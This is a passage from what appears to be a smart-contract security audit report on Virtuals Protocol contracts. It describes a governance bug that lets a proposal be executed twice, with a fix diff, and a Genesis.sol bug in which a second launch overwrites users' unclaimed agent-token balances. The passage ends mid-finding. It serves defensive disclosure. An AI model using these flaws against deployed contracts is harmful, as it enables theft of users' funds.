<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bytes</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">calldatas</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bytes32</span><span class="mtk1"> </span><span class="mtk3">/*descriptionHash*/</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">virtual</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">targets</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">; ++</span><span class="mtk12">i</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            (</span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">success</span><span class="mtk1">, </span><span class="mtk12">bytes</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">returndata</span><span class="mtk1">) = </span><span class="mtk12">targets</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">call</span><span class="mtk1">{value: </span><span class="mtk12">values</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]}(</span><span class="mtk12">calldatas</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">Address</span><span class="mtk1">.</span><span class="mtk11">verifyCallResult</span><span class="mtk1">(</span><span class="mtk12">success</span><span class="mtk1">, </span><span class="mtk12">returndata</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>This is problematic because a user can call <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/08566bfe0d19384af30a70815251fa913a19678b/contracts/governance/Governor.sol#L390-L425"><code>execute()</code></a> from the <code>Governor.sol</code> abstract contract to execute the proposal again, since <code>_proposals[proposalId].executed</code> is not set to <code>true</code>, as shown in the <code>execute()</code>.</p>
<pre data-index="98" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">execute</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">targets</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">values</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bytes</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">calldatas</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bytes32</span><span class="mtk1"> </span><span class="mtk12">descriptionHash</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">payable</span><span class="mtk1"> </span><span class="mtk11">virtual</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1"> = </span><span class="mtk11">hashProposal</span><span class="mtk1">(</span><span class="mtk12">targets</span><span class="mtk1">, </span><span class="mtk12">values</span><span class="mtk1">, </span><span class="mtk12">calldatas</span><span class="mtk1">, </span><span class="mtk12">descriptionHash</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_validateStateBitmap</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">proposalId</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">_encodeStateBitmap</span><span class="mtk1">(</span><span class="mtk12">ProposalState</span><span class="mtk1">.</span><span class="mtk12">Succeeded</span><span class="mtk1">) | </span><span class="mtk11">_encodeStateBitmap</span><span class="mtk1">(</span><span class="mtk12">ProposalState</span><span class="mtk1">.</span><span class="mtk12">Queued</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// mark as executed before calls to avoid reentrancy</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">@&gt;      </span><span class="mtk12">_proposals</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">].</span><span class="mtk12">executed</span><span class="mtk1"> = </span><span class="mtk4">true</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">       </span><span class="mtk3">///code...</span></span></span></code></pre>
<p>As shown, <code>executed</code> is set to <code>true</code> to prevent a proposal from being executed more than once. However, when <code>_executeOperations()</code> is used directly, this flag is not set. Since the <code>execute()</code> function is public and not overridden to include access control, any user can call it, allowing the proposal to be executed a second time.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-21"><a class="anchor before" aria-label="recommended mitigation steps 21 permalink" href="#recommended-mitigation-steps-21"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>To resolve the issue, replace the call to <code>_executeOperations()</code> with a call to <code>execute()</code>.</p>
<pre data-index="99" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">function earlyExecute(uint256 proposalId) public payable onlyRole(EXECUTOR_ROLE) returns (uint256) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        (</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            address[] memory targets,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            uint256[] memory values,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            bytes[] memory calldatas,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            bytes32 descriptionHash</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ) = proposalDetails(proposalId);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        require(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            state(proposalId) == ProposalState.Active &amp;&amp;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                _voteSucceeded(proposalId) &amp;&amp;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                _quorumReached(proposalId) &amp;&amp;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                !_earlyExecutions[proposalId],</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            "Proposal not ready for early execution"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // avoid reentrancy</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        _earlyExecutions[proposalId] = true;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">-       _executeOperations(proposalId, targets, values, calldatas, descriptionHash);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+       execute(targets, values, calldatas, descriptionHash);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        emit ProposalExecuted(proposalId);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        return proposalId;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<hr>
<h2 style="position:relative;" id="m-18-genesissolongenesissuccess-users-may-lose-their-unclaimed-agenttokens-if-a-second-launch-occurs-before-theyve-claimed-their-rewards-from-the-first"><a class="anchor before" aria-label="m 18 genesissolongenesissuccess users may lose their unclaimed agenttokens if a second launch occurs before theyve claimed their rewards from the first permalink" href="#m-18-genesissolongenesissuccess-users-may-lose-their-unclaimed-agenttokens-if-a-second-launch-occurs-before-theyve-claimed-their-rewards-from-the-first"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-114">[M-18] <code>Genesis.sol:onGenesisSuccess()</code> users may lose their unclaimed <code>agentTokens</code> if a second launch occurs before they’ve claimed their rewards from the first</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-66">Fitro</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-705">dreamcoder</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/genesis/Genesis.sol#L205-L304">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/genesis/Genesis.sol#L205-L304</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-5"><a class="anchor before" aria-label="finding description and impact 5 permalink" href="#finding-description-and-impact-5"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p><code>onGenesisSuccess()</code> is used to refund virtual tokens to users and to account for the agent tokens earned by participating in a successful genesis event.</p>
<pre data-index="100" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">onGenesisSuccess</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">calldata</span><span class="mtk1"> </span><span class="mtk12">refundVirtualsTokenUserAddresses</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1">[] </span><span class="mtk12">calldata</span><span class="mtk1"> </span><span class="mtk12">refundVirtualsTokenUserAmounts</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">calldata</span><span class="mtk1"> </span><span class="mtk12">distributeAgentTokenUserAddresses</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1">[] </span><span class="mtk12">calldata</span><span class="mtk1"> </span><span class="mtk12">distributeAgentTokenUserAmounts</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">creator</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyRole</span><span class="mtk1">(</span><span class="mtk12">FACTORY_ROLE</span><span class="mtk1">) </span><span class="mtk11">nonReentrant</span><span class="mtk1"> </span><span class="mtk11">whenNotCancelled</span><span class="mtk1"> </span><span class="mtk11">whenNotFailed</span><span class="mtk1"> </span><span class="mtk11">whenEnded</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">//code...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Check if launch has been called before</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">isFirstLaunch</span><span class="mtk1"> = </span><span class="mtk12">agentTokenAddress</span><span class="mtk1"> == </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Calculate required balance based on whether this is first launch</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">requiredVirtualsBalance</span><span class="mtk1"> = </span><span class="mtk12">isFirstLaunch</span><span class="mtk1"> ? </span><span class="mtk12">totalRefundAmount</span><span class="mtk1"> + </span><span class="mtk12">reserveAmount</span><span class="mtk1"> : </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">totalRefundAmount</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Check if contract has enough virtuals balance</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">virtualTokenAddress</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">)) &gt;= </span><span class="mtk12">requiredVirtualsBalance</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">"Insufficient Virtual Token balance"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Only do launch related operations if this is first launch</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">isFirstLaunch</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// grant allowance to agentFactoryAddress for launch</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">virtualTokenAddress</span><span class="mtk1">).</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk12">agentFactoryAddress</span><span class="mtk1">, </span><span class="mtk12">reserveAmount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Call initFromBondingCurve and executeBondingCurveApplication</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">id</span><span class="mtk1"> = </span><span class="mtk11">IAgentFactoryV3</span><span class="mtk1">(</span><span class="mtk12">agentFactoryAddress</span><span class="mtk1">).</span><span class="mtk11">initFromBondingCurve</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">string</span><span class="mtk1">.</span><span class="mtk11">concat</span><span class="mtk1">(</span><span class="mtk12">genesisName</span><span class="mtk1">, </span><span class="mtk8">" by Virtuals"</span><span class="mtk1">),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">genesisTicker</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">genesisCores</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">tbaSalt</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">tbaImplementation</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">daoVotingPeriod</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">daoThreshold</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">reserveAmount</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">creator</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">agentToken</span><span class="mtk1"> = </span><span class="mtk11">IAgentFactoryV3</span><span class="mtk1">(</span><span class="mtk12">agentFactoryAddress</span><span class="mtk1">).</span><span class="mtk11">executeBondingCurveApplication</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">id</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">agentTokenTotalSupply</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">agentTokenLpSupply</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">) </span><span class="mtk3">// vault</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">agentToken</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"Agent token creation failed"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Store the created agent token address</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">agentTokenAddress</span><span class="mtk1"> = </span><span class="mtk12">agentToken</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Calculate total distribution amount</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">totalDistributionAmount</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">distributeAgentTokenUserAmounts</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">totalDistributionAmount</span><span class="mtk1"> += </span><span class="mtk12">distributeAgentTokenUserAmounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Check if contract has enough agent token balance only after agentTokenAddress be set</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">agentTokenAddress</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">)) &gt;= </span><span class="mtk12">totalDistributionAmount</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">"Insufficient Agent Token balance"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Directly transfer Virtual Token refunds</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">refundVirtualsTokenUserAddresses</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// first decrease the virtuals mapping of the user to prevent reentrancy attacks</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">mapAddrToVirtuals</span><span class="mtk1">[</span><span class="mtk12">refundVirtualsTokenUserAddresses</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]] -= </span><span class="mtk12">refundVirtualsTokenUserAmounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// then transfer the virtuals</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">virtualTokenAddress</span><span class="mtk1">).</span><span class="mtk11">safeTransfer</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">refundVirtualsTokenUserAddresses</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">],</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">refundVirtualsTokenUserAmounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">RefundClaimed</span><span class="mtk1">(</span><span class="mtk12">genesisId</span><span class="mtk1">, </span><span class="mtk12">refundVirtualsTokenUserAddresses</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">], </span><span class="mtk12">refundVirtualsTokenUserAmounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// save the amount of agent tokens to claim</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">distributeAgentTokenUserAddresses</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">@&gt;          </span><span class="mtk12">claimableAgentTokens</span><span class="mtk1">[</span><span class="mtk12">distributeAgentTokenUserAddresses</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]] = </span><span class="mtk12">distributeAgentTokenUserAmounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]; </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">GenesisSucceeded</span><span class="mtk1">(</span><span class="mtk12">genesisId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">agentTokenAddress</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>Multiple launches can occur, which is why the <code>isFirstLaunch</code> flag is implemented. However, there’s an issue in how <code>agentTokens</code> are accounted for in the <code>claimableAgentTokens</code> mapping.</p>
<p>Currently, the mapping value is being overwritten instead of incremented. This means if a user doesn’t call <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/genesis/Genesis.sol#L307-L318"><code>claimAgentToken()</code></a> to redeem their <code>agentTokens</code> before a subsequent launch occurs, the second launch will overwrite the previous value resulting in a loss of <code>agentTokens</code> from the first launch.</p>
